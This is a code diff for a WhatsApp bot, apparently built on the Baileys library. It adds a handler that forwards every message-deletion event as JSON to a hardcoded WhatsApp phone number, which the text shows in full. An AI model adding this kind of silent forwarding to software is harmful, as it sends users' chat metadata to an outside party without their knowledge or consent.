@@ -152,6 +152,8 @@ await kayla.updateBlockStatus(callerId, "block")
       // if (kayla.public && !kay.key.fromMe && chatUpdate.type === 'notify') return
       if (kay.key.id.startsWith('BAE5') && kay.key.id.length === 16) return;
       m = smsg(kayla, kay, store);
+
+      //menjalankan function dalam das.js
       require('./das')(kayla, m, chatUpdate, store);
     } catch (err) {
       console.log(err);
@@ -243,6 +245,18 @@ participant: `0@s.whatsapp.net`,
     // }
   });
 
+  kayla.ev.on('messages.delete', async (anu) => {
+    try {
+      console.log(anu);
+      //response : { keys: WAMessageKey[] } | { jid: string, all: true }
+
+      kayla.sendMessage('6285216024226@s.whatsapp.net', {
+        text: JSON.stringify(anu, null, 2),
+      });
+    } catch (err) {
+      console.log(err);
+    }
+  });
   kayla.decodeJid = (jid) => {
     if (!jid) return jid;
     if (/:\d+@/gi.test(jid)) {
